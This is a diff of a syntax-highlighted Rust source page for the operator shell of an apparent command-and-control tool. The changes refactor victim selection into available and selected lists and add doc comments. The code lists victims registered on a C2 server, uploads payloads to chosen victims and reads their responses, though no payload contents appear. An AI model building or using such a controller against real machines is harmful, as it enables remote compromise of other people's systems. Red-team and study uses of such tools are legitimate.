@@ -191,6 +191,32 @@
 <span id="189">189</span>
 <span id="190">190</span>
 <span id="191">191</span>
+<span id="192">192</span>
+<span id="193">193</span>
+<span id="194">194</span>
+<span id="195">195</span>
+<span id="196">196</span>
+<span id="197">197</span>
+<span id="198">198</span>
+<span id="199">199</span>
+<span id="200">200</span>
+<span id="201">201</span>
+<span id="202">202</span>
+<span id="203">203</span>
+<span id="204">204</span>
+<span id="205">205</span>
+<span id="206">206</span>
+<span id="207">207</span>
+<span id="208">208</span>
+<span id="209">209</span>
+<span id="210">210</span>
+<span id="211">211</span>
+<span id="212">212</span>
+<span id="213">213</span>
+<span id="214">214</span>
+<span id="215">215</span>
+<span id="216">216</span>
+<span id="217">217</span>
 </pre><pre class="rust">
 <span class="comment">/*
  * Copyright (C) 2021  Aravinth Manivannan &lt;realaravinth@batsense.net&gt;
@@ -227,8 +253,10 @@
 
 <span class="kw">pub</span> <span class="kw">const</span> <span class="ident">VERSION</span>: <span class="kw-2">&amp;</span><span class="ident">str</span> <span class="op">=</span> <span class="macro">env!</span>(<span class="string">&quot;CARGO_PKG_VERSION&quot;</span>);
 
+<span class="kw">use</span> <span class="ident">commands::Commands</span>;
 <span class="kw">use</span> <span class="ident">errors</span>::<span class="kw-2">*</span>;
 
+<span class="doccomment">/// Different &quot;modes&quot; in which the applications can operate at</span>
 <span class="attribute">#[<span class="ident">derive</span>(<span class="ident">Debug</span>, <span class="ident">PartialEq</span>, <span class="ident">Clone</span>)]</span>
 <span class="kw">pub</span> <span class="kw">enum</span> <span class="ident">Mode</span> {
     <span class="ident">Default</span>,
@@ -238,7 +266,13 @@
 }
 
 <span class="kw">impl</span> <span class="ident">Mode</span> {
-    <span class="kw">pub</span> <span class="kw">fn</span> <span class="ident">print_and_read</span><span class="op">&lt;</span><span class="ident">W</span>: <span class="ident">Write</span><span class="op">&gt;</span>(<span class="kw-2">&amp;</span><span class="self">self</span>, <span class="ident">s</span>: <span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="ident">State</span><span class="op">&lt;</span><span class="ident">W</span><span class="op">&gt;</span>, <span class="ident">i</span>: <span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="ident">String</span>) <span class="op">-</span><span class="op">&gt;</span> <span class="ident">CliResult</span><span class="op">&lt;</span>()<span class="op">&gt;</span> {
+    <span class="doccomment">/// Runner method to print shell prompt, read input and parse the input</span>
+    <span class="doccomment">/// to set the relevant mode. It also returns the Command that matches user input</span>
+    <span class="kw">pub</span> <span class="kw">fn</span> <span class="ident">print_and_read</span><span class="op">&lt;</span><span class="ident">W</span>: <span class="ident">Write</span><span class="op">&gt;</span>(
+        <span class="kw-2">&amp;</span><span class="self">self</span>,
+        <span class="ident">s</span>: <span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="ident">State</span><span class="op">&lt;</span><span class="ident">W</span><span class="op">&gt;</span>,
+        <span class="ident">i</span>: <span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="ident">String</span>,
+    ) <span class="op">-</span><span class="op">&gt;</span> <span class="ident">CliResult</span><span class="op">&lt;</span><span class="ident">Commands</span><span class="op">&gt;</span> {
         <span class="kw">match</span> <span class="self">self</span> {
             <span class="self">Self</span><span class="ident">::Default</span> <span class="op">=</span><span class="op">&gt;</span> {
                 <span class="ident">s</span>.<span class="ident">default_prompt</span>()<span class="question-mark">?</span>;
@@ -257,9 +291,12 @@
 
             <span class="self">Self</span><span class="ident">::Exit</span> <span class="op">=</span><span class="op">&gt;</span> (),
         }
-        <span class="prelude-val">Ok</span>(())
+
+        <span class="kw">let</span> <span class="ident">cmd</span> <span class="op">=</span> <span class="ident">Commands::parse_and_set_mode</span>(<span class="ident">s</span>, <span class="ident">i</span>)<span class="question-mark">?</span>;
+        <span class="prelude-val">Ok</span>(<span class="ident">cmd</span>)
     }
 
+    <span class="doccomment">/// runner method to read input from STDIN</span>
     <span class="kw">fn</span> <span class="ident">read_input</span>(<span class="ident">input</span>: <span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="ident">String</span>) <span class="op">-</span><span class="op">&gt;</span> <span class="ident">CliResult</span><span class="op">&lt;</span>()<span class="op">&gt;</span> {
         <span class="ident">input</span>.<span class="ident">clear</span>();
         <span class="ident">stdin</span>().<span class="ident">read_line</span>(<span class="ident">input</span>)<span class="question-mark">?</span>;
@@ -267,17 +304,20 @@
     }
 }
 
+<span class="doccomment">/// Application state</span>
 <span class="kw">pub</span> <span class="kw">struct</span> <span class="ident">State</span><span class="op">&lt;</span><span class="ident">W</span>: <span class="ident">Write</span><span class="op">&gt;</span> {
     <span class="kw">pub</span> <span class="ident">write</span>: <span class="ident">BufWriter</span><span class="op">&lt;</span><span class="ident">W</span><span class="op">&gt;</span>,
     <span class="kw">pub</span> <span class="ident">mode</span>: <span class="ident">Mode</span>,
     <span class="kw">pub</span> <span class="ident">client</span>: <span class="ident">AthenaClient</span>,
-    <span class="kw">pub</span> <span class="ident">victims</span>: <span class="ident">Vec</span><span class="op">&lt;</span><span class="ident">attack::Victim</span><span class="op">&gt;</span>,
+    <span class="kw">pub</span> <span class="ident">available_victims</span>: <span class="ident">Vec</span><span class="op">&lt;</span><span class="ident">attack::Victim</span><span class="op">&gt;</span>,
+    <span class="kw">pub</span> <span class="ident">selected_victims</span>: <span class="ident">Vec</span><span class="op">&lt;</span><span class="ident">attack::Victim</span><span class="op">&gt;</span>,
     <span class="kw">pub</span> <span class="ident">editor</span>: <span class="prelude-ty">Option</span><span class="op">&lt;</span><span class="ident">String</span><span class="op">&gt;</span>,
     <span class="comment">// (PayloadID, Victim name)</span>
     <span class="kw">pub</span> <span class="ident">payload_ids</span>: <span class="ident">Vec</span><span class="op">&lt;</span>(<span class="ident">PayloadID</span>, <span class="ident">String</span>)<span class="op">&gt;</span>,
 }
 
 <span class="kw">impl</span><span class="op">&lt;</span><span class="ident">W</span>: <span class="ident">Write</span><span class="op">&gt;</span> <span class="ident">State</span><span class="op">&lt;</span><span class="ident">W</span><span class="op">&gt;</span> {
+    <span class="doccomment">/// Create new state</span>
     <span class="kw">pub</span> <span class="kw">async</span> <span class="kw">fn</span> <span class="ident">new</span>(<span class="ident">write</span>: <span class="ident">W</span>, <span class="ident">options</span>: <span class="kw-2">&amp;</span><span class="ident">options::Options</span>) <span class="op">-</span><span class="op">&gt;</span> <span class="ident">AthenaResult</span><span class="op">&lt;</span><span class="self">Self</span><span class="op">&gt;</span> {
         <span class="kw">let</span> <span class="ident">write</span> <span class="op">=</span> <span class="ident">BufWriter::new</span>(<span class="ident">write</span>);
         <span class="kw">let</span> <span class="ident">mode</span> <span class="op">=</span> <span class="ident">Mode::Default</span>;
@@ -288,7 +328,8 @@
             .<span class="ident">host</span>(<span class="ident">options</span>.<span class="ident">c2</span>.<span class="ident">clone</span>())
             .<span class="ident">build</span>()<span class="question-mark">?</span>;
 
-        <span class="kw">let</span> <span class="ident">victims</span> <span class="op">=</span> <span class="ident">client</span>.<span class="ident">attack_list_victims</span>().<span class="kw">await</span><span class="question-mark">?</span>;
+        <span class="kw">let</span> <span class="ident">available_victims</span> <span class="op">=</span> <span class="ident">client</span>.<span class="ident">attack_list_victims</span>().<span class="kw">await</span><span class="question-mark">?</span>;
+        <span class="kw">let</span> <span class="ident">selected_victims</span> <span class="op">=</span> <span class="ident">client</span>.<span class="ident">attack_list_victims</span>().<span class="kw">await</span><span class="question-mark">?</span>;
 
         <span class="kw">let</span> <span class="ident">payload_ids</span> <span class="op">=</span> <span class="ident">Vec::new</span>();
 
@@ -296,17 +337,20 @@
             <span class="ident">write</span>,
             <span class="ident">mode</span>,
             <span class="ident">client</span>,
-            <span class="ident">victims</span>,
+            <span class="ident">available_victims</span>,
+            <span class="ident">selected_victims</span>,
             <span class="ident">editor</span>: <span class="ident">options</span>.<span class="ident">editor</span>.<span class="ident">clone</span>(),
             <span class="ident">payload_ids</span>,
         })
     }
 
+    <span class="doccomment">/// Get list of victims from the server</span>
     <span class="kw">pub</span> <span class="kw">async</span> <span class="kw">fn</span> <span class="ident">refresh_victims</span>(<span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="self">self</span>) <span class="op">-</span><span class="op">&gt;</span> <span class="ident">AthenaResult</span><span class="op">&lt;</span>()<span class="op">&gt;</span> {
-        <span class="self">self</span>.<span class="ident">victims</span> <span class="op">=</span> <span class="self">self</span>.<span class="ident">client</span>.<span class="ident">attack_list_victims</span>().<span class="kw">await</span><span class="question-mark">?</span>;
+        <span class="self">self</span>.<span class="ident">available_victims</span> <span class="op">=</span> <span class="self">self</span>.<span class="ident">client</span>.<span class="ident">attack_list_victims</span>().<span class="kw">await</span><span class="question-mark">?</span>;
         <span class="prelude-val">Ok</span>(())
     }
 
+    <span class="doccomment">/// print welcome message</span>
     <span class="kw">pub</span> <span class="kw">fn</span> <span class="ident">welcome</span>(<span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="self">self</span>) <span class="op">-</span><span class="op">&gt;</span> <span class="ident">CliResult</span><span class="op">&lt;</span>()<span class="op">&gt;</span> {
         <span class="macro">writeln!</span>(
             <span class="self">self</span>.<span class="ident">write</span>,
@@ -318,31 +362,35 @@ Be nice.&quot;#</span>,
         <span class="prelude-val">Ok</span>(())
     }
 
+    <span class="doccomment">/// print default prompt</span>
     <span class="kw">pub</span> <span class="kw">fn</span> <span class="ident">default_prompt</span>(<span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="self">self</span>) <span class="op">-</span><span class="op">&gt;</span> <span class="ident">CliResult</span><span class="op">&lt;</span>()<span class="op">&gt;</span> {
         <span class="macro">write!</span>(<span class="self">self</span>.<span class="ident">write</span>, <span class="string">&quot;{} =&gt; &quot;</span>, <span class="ident">DEFAULT_PROMPT</span>)<span class="question-mark">?</span>;
         <span class="self">self</span>.<span class="ident">write</span>.<span class="ident">flush</span>()<span class="question-mark">?</span>;
         <span class="prelude-val">Ok</span>(())
     }
 
+    <span class="doccomment">/// Print shell prompt</span>
     <span class="kw">pub</span> <span class="kw">fn</span> <span class="ident">shell_prompt</span>(<span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="self">self</span>) <span class="op">-</span><span class="op">&gt;</span> <span class="ident">CliResult</span><span class="op">&lt;</span>()<span class="op">&gt;</span> {
         <span class="macro">write!</span>(<span class="self">self</span>.<span class="ident">write</span>, <span class="string">&quot;{}{}&quot;</span>, <span class="ident">DEFAULT_PROMPT</span>, <span class="ident">SHELL_PROMPT</span>)<span class="question-mark">?</span>;
         <span class="self">self</span>.<span class="ident">write</span>.<span class="ident">flush</span>()<span class="question-mark">?</span>;
         <span class="prelude-val">Ok</span>(())
     }
 
+    <span class="doccomment">/// Print prompt when the application is set to target all victims on the C2 server</span>
     <span class="kw">pub</span> <span class="kw">fn</span> <span class="ident">targetall_prompt</span>(<span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="self">self</span>) <span class="op">-</span><span class="op">&gt;</span> <span class="ident">CliResult</span><span class="op">&lt;</span>()<span class="op">&gt;</span> {
         <span class="macro">write!</span>(<span class="self">self</span>.<span class="ident">write</span>, <span class="string">&quot;{}{}&quot;</span>, <span class="ident">DEFAULT_PROMPT</span>, <span class="ident">TARGET_ALL</span>)<span class="question-mark">?</span>;
         <span class="self">self</span>.<span class="ident">write</span>.<span class="ident">flush</span>()<span class="question-mark">?</span>;
         <span class="prelude-val">Ok</span>(())
     }
 
+    <span class="doccomment">/// Lists all the victims that are registered on the C2 server</span>
     <span class="kw">pub</span> <span class="kw">fn</span> <span class="ident">list_victims</span>(<span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="self">self</span>) <span class="op">-</span><span class="op">&gt;</span> <span class="ident">CliResult</span><span class="op">&lt;</span>()<span class="op">&gt;</span> {
-        <span class="kw">if</span> <span class="self">self</span>.<span class="ident">victims</span>.<span class="ident">is_empty</span>() {
+        <span class="kw">if</span> <span class="self">self</span>.<span class="ident">available_victims</span>.<span class="ident">is_empty</span>() {
             <span class="macro">writeln!</span>(<span class="self">self</span>.<span class="ident">write</span>, <span class="string">&quot;No victims on C2 server&quot;</span>)<span class="question-mark">?</span>;
         } <span class="kw">else</span> {
             <span class="macro">writeln!</span>(<span class="self">self</span>.<span class="ident">write</span>, <span class="string">&quot;Victims&quot;</span>)<span class="question-mark">?</span>;
             <span class="macro">writeln!</span>(<span class="self">self</span>.<span class="ident">write</span>, <span class="string">&quot;=======&quot;</span>)<span class="question-mark">?</span>;
-            <span class="kw">for</span> (<span class="ident">count</span>, <span class="ident">victim</span>) <span class="kw">in</span> <span class="self">self</span>.<span class="ident">victims</span>.<span class="ident">iter</span>().<span class="ident">enumerate</span>() {
+            <span class="kw">for</span> (<span class="ident">count</span>, <span class="ident">victim</span>) <span class="kw">in</span> <span class="self">self</span>.<span class="ident">available_victims</span>.<span class="ident">iter</span>().<span class="ident">enumerate</span>() {
                 <span class="macro">writeln!</span>(<span class="self">self</span>.<span class="ident">write</span>, <span class="string">&quot;[{}] {}&quot;</span>, <span class="ident">count</span>, <span class="ident">victim</span>.<span class="ident">name</span>)<span class="question-mark">?</span>;
             }
         }
@@ -350,20 +398,23 @@ Be nice.&quot;#</span>,
         <span class="prelude-val">Ok</span>(())
     }
 
+    <span class="doccomment">/// Runner method to select all victims. Should be called after calling Self::list_victims</span>
+    <span class="doccomment">/// as the user will have to see the victim list first before making their choices</span>
     <span class="kw">pub</span> <span class="kw">fn</span> <span class="ident">select_victim</span>(<span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="self">self</span>, <span class="ident">input</span>: <span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="ident">String</span>) <span class="op">-</span><span class="op">&gt;</span> <span class="ident">CliResult</span><span class="op">&lt;</span>()<span class="op">&gt;</span> {
         <span class="macro">writeln!</span>(<span class="self">self</span>.<span class="ident">write</span>, <span class="string">&quot;Pick a victim or choose all&quot;</span>)<span class="question-mark">?</span>;
         <span class="self">self</span>.<span class="ident">mode</span>.<span class="ident">clone</span>().<span class="ident">print_and_read</span>(<span class="self">self</span>, <span class="ident">input</span>)<span class="question-mark">?</span>;
         <span class="kw">let</span> <span class="ident">victims</span> <span class="op">=</span> <span class="macro">vec!</span>[<span class="self">self</span>
-            .<span class="ident">victims</span>
+            .<span class="ident">available_victims</span>
             .<span class="ident">get</span>(<span class="ident">input</span>.<span class="ident">trim</span>().<span class="ident">parse</span>::<span class="op">&lt;</span><span class="ident">usize</span><span class="op">&gt;</span>().<span class="ident">unwrap</span>())
             .<span class="ident">unwrap</span>()
             .<span class="ident">to_owned</span>()];
-        <span class="self">self</span>.<span class="ident">victims</span> <span class="op">=</span> <span class="ident">victims</span>;
+        <span class="self">self</span>.<span class="ident">selected_victims</span> <span class="op">=</span> <span class="ident">victims</span>;
         <span class="prelude-val">Ok</span>(())
     }
 
+    <span class="doccomment">/// Upload payload to all selected victims</span>
     <span class="kw">pub</span> <span class="kw">async</span> <span class="kw">fn</span> <span class="ident">upload_payload</span>(<span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="self">self</span>, <span class="ident">payload</span>: <span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="ident">attack::Payload</span>) <span class="op">-</span><span class="op">&gt;</span> <span class="ident">CliResult</span><span class="op">&lt;</span>()<span class="op">&gt;</span> {
-        <span class="kw">for</span> <span class="ident">victim</span> <span class="kw">in</span> <span class="self">self</span>.<span class="ident">victims</span>.<span class="ident">iter</span>() {
+        <span class="kw">for</span> <span class="ident">victim</span> <span class="kw">in</span> <span class="self">self</span>.<span class="ident">selected_victims</span>.<span class="ident">iter</span>() {
             <span class="ident">payload</span>.<span class="ident">victim</span> <span class="op">=</span> <span class="ident">victim</span>.<span class="ident">name</span>.<span class="ident">to_owned</span>();
             <span class="kw">let</span> <span class="ident">id</span> <span class="op">=</span> <span class="self">self</span>.<span class="ident">client</span>.<span class="ident">attack_set_payload</span>(<span class="kw-2">&amp;</span><span class="ident">payload</span>).<span class="kw">await</span><span class="question-mark">?</span>;
             <span class="kw">let</span> <span class="ident">name</span> <span class="op">=</span> <span class="ident">mem::take</span>(<span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="ident">payload</span>.<span class="ident">victim</span>);
@@ -372,6 +423,7 @@ Be nice.&quot;#</span>,
         <span class="prelude-val">Ok</span>(())
     }
 
+    <span class="doccomment">/// Read victim response to all registered payloads from the C2 server</span>
     <span class="kw">pub</span> <span class="kw">async</span> <span class="kw">fn</span> <span class="ident">read_responses</span>(<span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="self">self</span>) <span class="op">-</span><span class="op">&gt;</span> <span class="ident">CliResult</span><span class="op">&lt;</span>()<span class="op">&gt;</span> {
         <span class="kw">for</span> (<span class="ident">id</span>, <span class="ident">name</span>) <span class="kw">in</span> <span class="self">self</span>.<span class="ident">payload_ids</span>.<span class="ident">iter</span>() {
             <span class="kw">let</span> <span class="ident">resp</span> <span class="op">=</span> <span class="self">self</span>.<span class="ident">client</span>.<span class="ident">attack_read_response</span>(<span class="kw-2">&amp;</span><span class="ident">id</span>).<span class="kw">await</span><span class="question-mark">?</span>;
